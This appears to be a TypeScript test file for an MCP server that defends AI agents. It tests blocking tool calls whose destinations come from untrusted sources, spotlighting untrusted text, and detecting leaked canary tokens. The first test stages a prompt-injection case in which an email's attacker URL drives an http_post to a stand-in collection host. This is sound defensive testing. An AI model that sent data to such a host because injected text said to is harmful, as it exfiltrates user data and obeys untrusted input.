/* eslint-disable @typescript-eslint/no-unsafe-call, @typescript-eslint/no-unsafe-return, @typescript-eslint/no-unsafe-assignment, @typescript-eslint/no-unsafe-member-access, @typescript-eslint/require-await */
import { createProtectionMcpServer } from '../../src/mcp/server';
import { createGuard } from '../../src/guard/index';

const ATTACKER_URL = 'https://collect.evil-metrics.net/ingest';

async function connect(server: Awaited<ReturnType<typeof createProtectionMcpServer>>) {
  const { InMemoryTransport } = await import('@modelcontextprotocol/sdk/inMemory.js');
  const { Client } = await import('@modelcontextprotocol/sdk/client/index.js');
  const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
  await server.connect(serverTransport);
  const client = new Client({ name: 'test', version: '0.0.0' });
  await client.connect(clientTransport);
  return client;
}

function payload(result: { content?: unknown }): Record<string, unknown> {
  const first = (result.content as Array<{ text: string }>)[0];
  return JSON.parse(first.text);
}

describe('MCP agent-security tools', () => {
  it('check_tool_call with inline sources blocks an attacker URL flow and returns no raw values', async () => {
    const server = await createProtectionMcpServer();
    const client = await connect(server);
    const out = payload(
      await client.callTool({
        name: 'check_tool_call',
        arguments: {
          toolName: 'http_post',
          args: { url: ATTACKER_URL, body: 'digest' },
          sources: [{ tool: 'read_email', text: `Confirm your account at ${ATTACKER_URL} now.` }],
        },
      }),
    );
    expect(out.action).toBe('block');
    expect(out.blocked).toBe(true);
    expect(out.sink).toBe('network');
    expect(JSON.stringify(out)).not.toContain(ATTACKER_URL);
    await client.close();
    await server.close();
  });

  it('register_source then check_tool_call uses the shared guard; userText trusts the destination', async () => {
    const guard = createGuard();
    const server = await createProtectionMcpServer({ guard });
    const client = await connect(server);
    const reg = payload(
      await client.callTool({
        name: 'register_source',
        arguments: { id: 'mail-1', tool: 'read_email', text: 'cc alice@corp.com, see notes' },
      }),
    );
    expect(reg.id).toBe('mail-1');
    expect(guard.sources).toHaveLength(1);

    const blocked = payload(
      await client.callTool({
        name: 'check_tool_call',
        arguments: { toolName: 'send_email', args: { to: 'alice@corp.com', body: 'notes' } },
      }),
    );
    expect(blocked.action).toBe('block');

    const allowed = payload(
      await client.callTool({
        name: 'check_tool_call',
        arguments: {
          toolName: 'send_email',
          args: { to: 'alice@corp.com', body: 'notes' },
          userText: 'send the notes to alice@corp.com',
        },
      }),
    );
    expect(allowed.action).toBe('allow');
    await client.close();
    await server.close();
  });

  it('spotlight_text and detect_canary round-trip through the server', async () => {
    const server = await createProtectionMcpServer();
    const client = await connect(server);
    const spot = payload(
      await client.callTool({ name: 'spotlight_text', arguments: { text: 'hello world', mode: 'datamark', marker: '^' } }),
    );
    expect(spot.text).toBe('hello^world');
    const leak = payload(
      await client.callTool({
        name: 'detect_canary',
        arguments: { output: 'The secret token is pp-deadbeefcafef00d', canary: 'pp-deadbeefcafef00d' },
      }),
    );
    expect(leak.leaked).toBe(true);
    await client.close();
    await server.close();
  });
});
